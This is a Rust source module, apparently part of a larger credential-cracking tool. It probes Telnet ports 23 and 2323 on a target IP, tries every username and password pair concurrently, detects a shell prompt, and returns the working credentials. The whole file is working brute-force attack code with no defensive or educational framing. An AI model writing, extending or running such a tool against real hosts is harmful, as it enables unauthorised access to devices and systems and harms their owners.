// src/telnet.rs

use anyhow::{Context, Result};
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    net::TcpStream,
    sync::Arc,
    time::Duration,
};
use telnet::{Telnet, Event};
use tokio::task;
use crate::events::BruteEvent;

const TELNET_PORTS: &[u16] = &[23, 2323];
const CONNECT_TIMEOUT_SECS: u64 = 5;
const RETRY_DELAY_MS: u64 = 200;
const MAX_RETRIES: usize = 2;

/// Brute-force Telnet for a single IP, returning events
pub async fn bruteforce_ip(
    ip: String,
    usernames: Arc<Vec<String>>,
    passwords: Arc<Vec<String>>,
) -> Vec<BruteEvent>
 {
    let mut events = Vec::new();
    let mut open_port = None;

    for &port in TELNET_PORTS {
        if is_port_open(&ip, port).await {
            open_port = Some(port);
            events.push(BruteEvent::Info(format!("Telnet port {} open on {}", port, ip)));
            break;
        }
    }

    let port = match open_port {
        Some(port) => port,
        None => {
            events.push(BruteEvent::Fail(format!("No open Telnet port on {}", ip)));
            return events;
        }
    };

    let mut tasks = FuturesUnordered::new();

    for username in usernames.iter().cloned() {
        for password in passwords.iter().cloned() {
            let ip = ip.clone();
            let username = username.clone();
            let password = password.clone();

            tasks.push(task::spawn_blocking(move || {
                try_login(&ip, port, &username, &password)
            }));
        }
    }

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(success_string)) => {
                let parts: Vec<&str> = success_string.splitn(2, ':').collect();
                events.push(BruteEvent::Success {
                    protocol: "TELNET".to_string(),
                    ip: ip.clone(),
                    username: parts[0].to_string(),
                    password: parts[1].to_string(),
                    port,
                });
                return events;
            }
            Ok(Err(e)) => events.push(BruteEvent::Error(e.to_string())),
            Err(e) => events.push(BruteEvent::Error(format!("Join error: {}", e))),
        }
    }

    events.push(BruteEvent::Fail(format!("Telnet brute-force failed on {}", ip)));
    events
}

/// Checks if a port is open
async fn is_port_open(ip: &str, port: u16) -> bool {
    let ip = ip.to_string(); // clone it inside
    tokio::task::spawn_blocking(move || TcpStream::connect_timeout(
        &format!("{}:{}", ip, port).parse().unwrap(),
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
    ))
    .await
    .map(|r| r.is_ok())
    .unwrap_or(false)
}


/// Attempts Telnet login
fn try_login(ip: &str, port: u16, user: &str, pass: &str) -> Result<String> {
    const TELNET_BUFFER_SIZE: usize = 256; // <-- good buffer size

    for attempt in 1..=MAX_RETRIES {
        match Telnet::connect((ip, port), TELNET_BUFFER_SIZE) {
            Ok(mut connection) => {
                let mut username_sent = false;
                let mut password_sent = false;

                loop {
                    match connection.read_timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS))? {
                        Event::Data(buffer) => {
                            let response = String::from_utf8_lossy(&buffer).to_lowercase();

                            if response.contains("login:") && !username_sent {
                                connection.write(format!("{}\n", user).as_bytes())?;
                                username_sent = true;
                            } else if response.contains("password:") && !password_sent {
                                connection.write(format!("{}\n", pass).as_bytes())?;
                                password_sent = true;
                            } else if response.contains(">") || response.contains("#") || response.contains("$") {
                                connection.write(b"exit\n")?;
                                return Ok(format!("{}:{}", user, pass));
                            } else if response.contains("incorrect") || response.contains("failed") {
                                return Err(anyhow::anyhow!("Telnet authentication failed"));
                            }
                        }
                        _ => break,
                    }
                }
            }
            Err(e) => {
                if attempt < MAX_RETRIES {
                    std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
                } else {
                    return Err(anyhow::anyhow!("Connection error: {}", e));
                }
            }
        }
    }
    Err(anyhow::anyhow!("Max retries reached"))
}

